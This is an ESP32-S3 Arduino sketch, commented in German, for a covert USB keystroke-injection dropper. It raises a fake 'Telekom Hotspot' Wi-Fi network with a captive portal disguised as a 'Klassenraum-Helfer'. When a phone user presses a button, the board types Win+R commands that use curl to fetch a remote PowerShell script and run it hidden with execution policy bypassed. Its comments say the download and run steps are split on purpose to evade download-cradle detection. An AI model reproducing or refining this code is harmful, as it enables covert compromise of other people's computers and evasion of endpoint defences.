// HID_Dropper.ino - ESP32-S3: WLAN-Hotspot mit Installations-Knopf + HID-Tastatur
//
// Board steckt im Ziel-PC. Es spannt ein WLAN "Telekom Hotspot" auf (WPA2).
// Handy verbindet sich -> Portal oeffnet automatisch -> Knopf "Installieren"
// -> Board tippt zwei kurze Befehle in Win+R.
//
// Board: ESP32-S3, Arduino IDE:
//   Board "ESP32S3 Dev Module", USB Mode "USB-OTG (TinyUSB)"
//   USB CDC On Boot "Enabled"   <- sonst keine Logausgabe
//   Flash Size 4MB, Partition "Default 4MB with spiffs"
//
// Getippt wird mit deutschem Tastenlayout. Keyboard.write() sendet ASCII und
// wuerde auf einem deutschen Windows aus '-' ein 'ss' machen. Deshalb geht
// jedes Zeichen als roher HID-Usage-Code ueber pressRaw()/releaseRaw().

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;
WebServer server(80);
DNSServer dnsServer;

// ---------------------------------------------------------------------
// Einstellungen
// ---------------------------------------------------------------------
static const char* AP_SSID = "Telekom Hotspot";
static const char* AP_PASS = "Wand12!!";             // WPA2 verlangt mindestens 8 Zeichen

static const char* STAGE_URL =
    "https://raw.githubusercontent.com/ente1231/audiohost/main/Stage.txt";

// Zeitfenster. Zwei Schritte, zwei Win+R: erst holen, dann starten.
static const uint16_t START_DELAY_MS   = 3000;       // Zeit bis Windows Tasten annimmt
static const uint16_t WAKE_DELAY_MS    = 2600;       // Wecktaste bis Bildschirm wach ist
static const uint16_t RUNBOX_DELAY_MS  = 900;        // bis Win+R wirklich da ist
static const uint16_t PORTAL_DELAY_MS  = 1200;       // nach Klick warten, bis Seite weg ist
static const uint16_t NOTEPAD_DELAY_MS = 2200;       // bis Notepad ein Eingabefeld hat
static const uint16_t DOWNLOAD_WAIT_MS = 8000;       // Schritt 1 fertig, bevor Schritt 2 tippt

// Rohe HID-Usages. Keyboard.write(KEY_RETURN) & Co. sind auf dem ESP32-Core
// nicht zuverlaessig: KEY_END/KEY_BACKSPACE gehen als 0xB2/0xD1 durch die
// ASCII-Tabelle und kommen nie als Taste an. Ergebnis: die Run-Box wurde nicht
// geleert, der alte Befehl blieb stehen, und ab dem zweiten Klick passierte
// nichts mehr. pressRaw() schickt den Usage-Code direkt.
static const uint8_t KEYCODE_ENTER     = 0x28;
static const uint8_t KEYCODE_ESC       = 0x29;
static const uint8_t KEYCODE_BACKSPACE = 0x2A;
static const uint8_t KEYCODE_DELETE    = 0x4C;
static const uint8_t KEYCODE_END       = 0x4D;

// Tipptempo. 40 ms pro Taste war lesbar, aber zaeh. HID wird mit 1 ms gepollt,
// Windows vertraegt deutlich mehr. 10 ms Tastendruck + 5 ms Satz reicht.
static const uint16_t KEY_DOWN_MS   = 10;
static const uint16_t CHAR_GAP_MS   = 5;
static const uint16_t MOD_LEAD_MS   = 5;
static const uint16_t MOD_TRAIL_MS  = 5;

static volatile uint32_t g_installAt = 0;            // millis()-Zeitpunkt, 0 = nichts geplant
static volatile uint8_t  g_mode      = 0;            // 1 = installieren, 2 = Tastaturtest
static volatile bool     g_layoutDE  = true;
static volatile uint8_t  g_state     = 0;            // 0 leer, 1 geplant, 2 laeuft, 3 fertig, 4 fehler
static volatile uint8_t  g_phase     = 0;            // 1 = holen, 2 = starten (nur fuer die Anzeige)
static volatile uint32_t g_runCount  = 0;            // wie oft seit dem Einschalten getippt wurde
static volatile uint32_t g_finishAt  = 0;

// ---------------------------------------------------------------------
// Zeichen -> HID-Usage, deutsches Layout
// ---------------------------------------------------------------------
struct KeyDef { uint8_t usage; bool shift; bool altgr; };

static bool mapGerman(char c, KeyDef& out) {
  // Buchstaben: DE y und z liegen auf den US-Positionen von z und y
  if (c >= 'a' && c <= 'z') {
    if (c == 'y') { out = {0x1D, false, false}; return true; }
    if (c == 'z') { out = {0x1C, false, false}; return true; }
    out = {(uint8_t)(0x04 + (c - 'a')), false, false};
    return true;
  }
  if (c >= 'A' && c <= 'Z') {
    char l = (char)(c - 'A' + 'a');
    if (l == 'y') { out = {0x1D, true, false}; return true; }
    if (l == 'z') { out = {0x1C, true, false}; return true; }
    out = {(uint8_t)(0x04 + (l - 'a')), true, false};
    return true;
  }
  if (c >= '1' && c <= '9') { out = {(uint8_t)(0x1E + (c - '1')), false, false}; return true; }
  if (c == '0')             { out = {0x27, false, false}; return true; }

  switch (c) {
    case ' ':  out = {0x2C, false, false}; return true;
    case '.':  out = {0x37, false, false}; return true;
    case ',':  out = {0x36, false, false}; return true;
    case '-':  out = {0x38, false, false}; return true;   // US '/' = DE '-'
    case '_':  out = {0x38, true,  false}; return true;
    case '/':  out = {0x24, true,  false}; return true;   // Shift+7
    case ':':  out = {0x37, true,  false}; return true;   // Shift+.
    case '"':  out = {0x1F, true,  false}; return true;   // Shift+2
    case 0x27: out = {0x32, true,  false}; return true;   // ' = Shift+#
    case '#':  out = {0x32, false, false}; return true;
    case '(':  out = {0x25, true,  false}; return true;   // Shift+8
    case ')':  out = {0x26, true,  false}; return true;   // Shift+9
    case '=':  out = {0x27, true,  false}; return true;   // Shift+0
    case '?':  out = {0x2D, true,  false}; return true;   // Shift+ss
    case '+':  out = {0x30, false, false}; return true;
    case '*':  out = {0x30, true,  false}; return true;
    case '!':  out = {0x1E, true,  false}; return true;
    case '$':  out = {0x21, true,  false}; return true;
    case '%':  out = {0x22, true,  false}; return true;
    case '&':  out = {0x23, true,  false}; return true;
    case ';':  out = {0x33, true,  false}; return true;   // Shift+,
    case '<':  out = {0x64, false, false}; return true;   // DE <>
    case '>':  out = {0x64, true,  false}; return true;
    // AltGr-Ebene
    case '@':  out = {0x14, false, true};  return true;   // AltGr+Q
    case '|':  out = {0x64, false, true};  return true;   // AltGr+<
    case '\\': out = {0x2D, false, true};  return true;   // AltGr+ss
    case '~':  out = {0x30, false, true};  return true;   // AltGr++
    case '{':  out = {0x24, false, true};  return true;   // AltGr+7
    case '}':  out = {0x27, false, true};  return true;   // AltGr+0
    case '[':  out = {0x25, false, true};  return true;   // AltGr+8
    case ']':  out = {0x26, false, true};  return true;   // AltGr+9
    default: break;
  }
  return false;
}

// pressRaw() nimmt rohe HID-Usage-Codes (0x04 = a, 0x38 = der Strich neben dem Punkt).
// press() wuerde alles unter 0x80 als ASCII durch _asciimap schicken und aus
// 0x2C (Leertaste) ein Komma machen. Genau der Zeichensalat.
static void tap(uint8_t usage, bool shift, bool altgr) {
  if (shift)  Keyboard.press(KEY_LEFT_SHIFT);
  if (altgr)  Keyboard.press(KEY_RIGHT_ALT);
  if (shift || altgr) delay(MOD_LEAD_MS);

  Keyboard.pressRaw(usage);
  delay(KEY_DOWN_MS);
  Keyboard.releaseRaw(usage);
  delay(MOD_TRAIL_MS);

  if (altgr)  Keyboard.release(KEY_RIGHT_ALT);
  if (shift)  Keyboard.release(KEY_LEFT_SHIFT);
  delay(CHAR_GAP_MS);
}

static void typeChar(char c, bool de) {
  if (!de) { Keyboard.write(c); delay(KEY_DOWN_MS + CHAR_GAP_MS); return; }
  KeyDef k;
  if (mapGerman(c, k)) {
    tap(k.usage, k.shift, k.altgr);
  } else {
    Keyboard.write(c);
    delay(KEY_DOWN_MS + CHAR_GAP_MS);
  }
}

static void typeString(const char* s, bool de) {
  for (const char* p = s; *p; ++p) typeChar(*p, de);
}

// Eine einzelne Steuertaste ueber ihren rohen Usage-Code.
static void tapRaw(uint8_t usage) {
  Keyboard.pressRaw(usage);
  delay(KEY_DOWN_MS);
  Keyboard.releaseRaw(usage);
  delay(20);
}

// Wecktaste. Steckt das Board schon eine Weile, ist der Bildschirm aus oder
// der Rechner im Sparmodus - die ersten Tasten schluckt Windows dann.
// Ein paar Shift-Taps wecken, ohne irgendetwas auszuloesen.
static void wakeHost() {
  for (int i = 0; i < 3; ++i) {
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(40);
    Keyboard.release(KEY_LEFT_SHIFT);
    delay(180);
  }
  delay(WAKE_DELAY_MS);
}

// ---------------------------------------------------------------------
// Befehle
// ---------------------------------------------------------------------
// Ohne Anfuehrungszeichen, damit auf einem fremden Layout so wenig wie
// moeglich kippen kann. %TEMP% wird von der Run-Box selbst aufgeloest.
//
// Zwei Zeilen, zwei Win+R - bewusst getrennt:
//   Schritt 1  holt nur die Datei.
//   Schritt 2  startet nur die Datei.
// Eine Zeile mit "curl ... && powershell -ep bypass -f ..." ist ein
// Download-Cradle: ein Kommandozeilen-String, der Herunterladen und
// Ausfuehren verbindet. Genau dieses Muster wird angefasst. Getrennt steht
// in keiner der beiden Zeilen beides.
static String buildInstall() {
  String cmd = "curl.exe -sfL --retry 2 -o %TEMP%\\s.ps1 ";
  cmd += STAGE_URL;
  return cmd;
}

static String buildExecute() {
  return "powershell -ep bypass -w h -f %TEMP%\\s.ps1";
}

// Win+R, alter Inhalt raus, fertig fokussiert.
static void openRunBox() {
  // Ein haengengebliebener Dialog (Run-Box, Powershell-Fenster, UAC) wuerde
  // jedes Zeichen schlucken. Esc raeumt ihn weg, Win+R oeffnet neu.
  tapRaw(KEYCODE_ESC);
  delay(180);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(80);
  Keyboard.releaseAll();
  delay(RUNBOX_DELAY_MS);

  // Verlauf und Inline-Vorschlag rauswerfen: alles markieren, loeschen, und
  // zusaetzlich Backspace, falls das Feld kein Ctrl+A kennt. Ohne das haengt
  // die Run-Box den alten Befehl an und Enter fuehrt Muell aus.
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  delay(40);
  Keyboard.releaseAll();
  delay(50);
  tapRaw(KEYCODE_DELETE);
  tapRaw(KEYCODE_BACKSPACE);
  delay(120);
}

// Enter mit End davor: End schliesst das Inline-Vervollstaendigen ab, sonst
// fuehrt Enter den Vorschlag aus statt das Getippte.
static void submit() {
  delay(140);
  tapRaw(KEYCODE_END);
  delay(60);
  tapRaw(KEYCODE_ENTER);
}

// Installieren: zwei Runden Win+R.
//   1. curl holt Stage.txt nach %TEMP%\s.ps1, keine Ausfuehrung.
//   2. powershell startet die Datei, kein Download.
// Zwischen beiden liegt DOWNLOAD_WAIT_MS. Die Datei ist 5 KB; 8 s sind
// reichlich Puffer fuer ein traeges WLAN, ohne dass der Nutzer wartet.
static void runInstall() {
  String dl  = buildInstall();
  String run = buildExecute();

  g_state = 2;

  Serial.println("--- SCHRITT 1/2: holen ---");
  Serial.println(dl);
  g_phase = 1;
  wakeHost();
  openRunBox();
  typeString(dl.c_str(), g_layoutDE);
  submit();
  Keyboard.releaseAll();

  delay(DOWNLOAD_WAIT_MS);

  Serial.println("--- SCHRITT 2/2: starten ---");
  Serial.println(run);
  g_phase = 2;
  openRunBox();
  typeString(run.c_str(), g_layoutDE);
  submit();
  delay(400);
  Keyboard.releaseAll();

  g_phase = 0;
  g_runCount++;
  g_state = 3;
  g_finishAt = millis();
  Serial.println("fertig.");
}

// Tastaturtest: Notepad auf, Zeichenmuster tippen, KEIN Enter.
static void runKeyboardTest() {
  Serial.println("--- TEST ---");

  g_state = 2;
  wakeHost();
  openRunBox();
  typeString("notepad", false);
  delay(150);
  tapRaw(KEYCODE_ENTER);
  delay(NOTEPAD_DELAY_MS);

  typeString("!\"#$%&'()*+,-./0123456789:;<=>?@ABCXYZ[]_", g_layoutDE);
  tapRaw(KEYCODE_ENTER);
  typeString(buildInstall().c_str(), g_layoutDE);
  tapRaw(KEYCODE_ENTER);
  typeString(buildExecute().c_str(), g_layoutDE);
  tapRaw(KEYCODE_ENTER);
  Keyboard.releaseAll();

  g_runCount++;
  g_state = 3;
  g_finishAt = millis();
  Serial.println("fertig.");
}

// ---------------------------------------------------------------------
// Web-Portal
// ---------------------------------------------------------------------
static const char PAGE_HTML[] PROGMEM = R"HTML(<!doctype html>
<html lang="de"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#04140d">
<title>Klassenraum-Helfer</title>
<style>
:root{color-scheme:dark}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{margin:0;color:#eafaf2;
 font:16px/1.55 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
 background:#04140d;
 background-image:
  radial-gradient(120% 80% at 50% -10%,#1a8f5c 0%,#0c5f3c 34%,#062b1c 66%,#04140d 100%),
  radial-gradient(80% 60% at 100% 100%,#12a86c33 0%,transparent 70%);
 background-attachment:fixed;
 padding:max(22px,env(safe-area-inset-top)) 16px calc(48px + env(safe-area-inset-bottom));
 display:flex;justify-content:center}
.wrap{width:min(520px,100%)}
.badge{display:inline-block;font-size:12px;letter-spacing:.7px;text-transform:uppercase;
 color:#b8ffdd;background:#0c3d2a80;border:1px solid #2f8f63;border-radius:999px;
 padding:5px 12px;margin-bottom:16px;backdrop-filter:blur(6px)}
h1{font-size:25px;margin:0 0 6px;letter-spacing:-.4px}
p.sub{margin:0 0 22px;color:#a9c9b8;font-size:14px}
.card{background:#0820188c;border:1px solid #1e5c42;border-radius:20px;padding:18px;
 margin-bottom:14px;backdrop-filter:blur(10px)}
button.install{width:100%;font:inherit;font-weight:800;font-size:19px;letter-spacing:.2px;
 color:#03200f;background:linear-gradient(180deg,#8ef7b9,#25c07a);border:none;
 border-radius:16px;padding:22px;cursor:pointer;
 box-shadow:0 16px 36px -18px #25c07a,0 1px 0 #c7ffdf inset;
 transition:transform .06s ease,filter .15s ease}
button.install:active{transform:translateY(1px);filter:brightness(.95)}
button.install[disabled]{filter:saturate(.3) brightness(.7);cursor:default}
button.test{width:100%;font:inherit;font-size:15px;color:#cfeee0;background:#0a2a1e;
 border:1px solid #2b7757;border-radius:13px;padding:15px;cursor:pointer;margin-top:10px}
button.test:active{transform:translateY(1px)}
.hint{color:#9dbfae;font-size:13px;margin-top:12px}
.row{display:flex;gap:10px;align-items:center;margin-top:16px;
 border-top:1px solid #1a4b36;padding-top:14px}
.row label{flex:1;font-size:14px;color:#cfeee0}
select{font:inherit;color:#eafaf2;background:#0a2a1e;border:1px solid #2b7757;
 border-radius:10px;padding:10px 12px}
.steps{margin:0;padding-left:18px;color:#a9c9b8;font-size:14px}
.steps li{margin:7px 0}
#msg{margin-top:14px;font-size:14px;color:#b8ffdd;min-height:20px;font-weight:600}
.bar{height:6px;border-radius:99px;background:#0d3a29;overflow:hidden;margin-top:12px;display:none}
.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#25c07a,#8ef7b9);
 transition:width .4s ease}
code{background:#0a2a1e;border:1px solid #1e5c42;border-radius:6px;padding:2px 6px;font-size:13px}
</style></head><body><div class="wrap">
<div class="badge" id="badge">bereit</div>
<h1>Klassenraum-Helfer</h1>
<p class="sub">Dieser Rechner wird einmalig verbunden.</p>

<div class="card">
  <button class="install" id="go" onclick="go(1)">Jetzt installieren</button>
  <button class="test" id="test" onclick="go(2)">Tastatur testen (Notepad)</button>
  <div class="bar" id="bar"><i></i></div>
  <div id="msg"></div>
  <div class="hint">Der Rechner muss entsperrt und am Desktop sein. Nach dem Klick nichts anfassen.</div>
</div>

<div class="card">
  <ol class="steps">
    <li>Knopf druecken, Rechner nicht anfassen.</li>
    <li>Das Board tippt zwei Befehle: erst holen, dann starten. Rund 12 Sekunden.</li>
    <li>Danach: <code>https://panic-relay.onrender.com</code> am Handy oeffnen.</li>
  </ol>
</div>

<div class="card">
  <div class="row" style="margin-top:0;border-top:none;padding-top:0">
    <label for="layout">Tastatur des Rechners</label>
    <select id="layout">
      <option value="de" selected>Deutsch</option>
      <option value="us">Englisch (US)</option>
    </select>
  </div>
  <div class="hint">WLAN: <code>Telekom Hotspot</code> &nbsp; Passwort: <code>Wand12!!</code></div>
</div>
</div>
<script>
var poll=null, busy=false;
function el(id){return document.getElementById(id)}
function setMsg(t,col){var m=el('msg');m.textContent=t;m.style.color=col||'#b8ffdd'}
function setBusy(b){busy=b;el('go').disabled=b;el('test').disabled=b;el('badge').textContent=b?'laeuft':'bereit'}
function go(m){
  if(busy)return;
  setBusy(true);
  setMsg('Laeuft ... Rechner nicht anfassen.');
  el('bar').style.display='block';
  el('bar').firstChild.style.width='35%';
  var l=el('layout').value;
  fetch('/go?mode='+m+'&layout='+l,{method:'POST'}).then(function(r){return r.text()}).then(function(t){
    if(t!=='ok'){ throw new Error(t); }
    el('bar').firstChild.style.width='60%';
    poll=setInterval(check,900);
  }).catch(function(e){ clearInterval(poll); setBusy(false); setMsg('Fehler: '+e.message,'#ffb4a8'); });
}
function check(){
  fetch('/state',{cache:'no-store'}).then(function(r){return r.json()}).then(function(s){
    if(s.state===2){
      if(s.phase===2){ el('bar').firstChild.style.width='88%'; setMsg('Schritt 2 von 2: starten ...'); }
      else           { el('bar').firstChild.style.width='55%'; setMsg('Schritt 1 von 2: holen ...'); }
    }
    if(s.state===3){
      clearInterval(poll); el('bar').firstChild.style.width='100%';
      setMsg('Fertig. Der Rechner installiert sich jetzt selbst.','#b8ffdd');
      setTimeout(function(){ setBusy(false); el('bar').style.display='none'; el('bar').firstChild.style.width='0'; },2600);
    }
  }).catch(function(){});
}
</script></body></html>)HTML";

static void sendPortal() {
  server.send_P(200, "text/html; charset=utf-8", PAGE_HTML);
}

static void handleGo() {
  // Schon geplant oder laeuft gerade: nicht zweimal tippen lassen.
  if (g_state == 1 || g_state == 2) {
    server.send_P(200, "text/plain; charset=utf-8", "busy");
    return;
  }
  if (server.hasArg("layout")) g_layoutDE = (server.arg("layout") != "us");
  g_mode = (server.hasArg("mode") && server.arg("mode") == "2") ? 2 : 1;
  g_state = 1;
  g_installAt = millis() + PORTAL_DELAY_MS;
  server.send_P(200, "text/plain; charset=utf-8", "ok");
}

static void handleState() {
  char buf[112];
  snprintf(buf, sizeof(buf), "{\"state\":%u,\"phase\":%u,\"runs\":%u,\"up\":%u}",
           (unsigned)g_state, (unsigned)g_phase,
           (unsigned)g_runCount, (unsigned)(millis() / 1000));
  server.send(200, "application/json", buf);
}

static void handleNotFound() {
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
  server.send(302, "text/plain", "");
}

// ---------------------------------------------------------------------
void setup() {
  Serial.begin(115200);

  Keyboard.begin();
  USB.begin();

  WiFi.mode(WIFI_AP);
  WiFi.setSleep(false);
  WiFi.softAP(AP_SSID, AP_PASS);

  IPAddress ip = WiFi.softAPIP();

  dnsServer.start(53, "*", ip);

  server.on("/", HTTP_GET, sendPortal);
  server.on("/go", HTTP_POST, handleGo);
  server.on("/go", HTTP_GET, handleGo);
  server.on("/state", HTTP_GET, handleState);
  server.on("/install", HTTP_POST, handleGo);
  server.on("/install", HTTP_GET, handleGo);

  server.on("/generate_204", HTTP_GET, handleNotFound);
  server.on("/gen_204", HTTP_GET, handleNotFound);
  server.on("/hotspot-detect.html", HTTP_GET, sendPortal);
  server.on("/connecttest.txt", HTTP_GET, handleNotFound);
  server.on("/ncsi.txt", HTTP_GET, handleNotFound);
  server.on("/fwlink", HTTP_GET, handleNotFound);

  server.onNotFound(handleNotFound);
  server.begin();

  Serial.printf("\nAP: %s  ->  http://%s/\n", AP_SSID, ip.toString().c_str());
  Serial.println("bereit.");

  delay(START_DELAY_MS);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (g_installAt != 0 && (int32_t)(millis() - g_installAt) >= 0) {
    uint8_t mode = g_mode;
    g_installAt = 0;
    g_mode = 0;
    if (mode == 2) runKeyboardTest();
    else           runInstall();
  }

  // Fertig-Meldung nach 15 s zurueck auf "leer", damit der naechste Klick
  // wieder von vorn anfaengt und nicht auf einem alten Zustand haengt.
  if (g_finishAt != 0 && millis() - g_finishAt > 15000) {
    g_finishAt = 0;
    g_state = 0;
  }
}
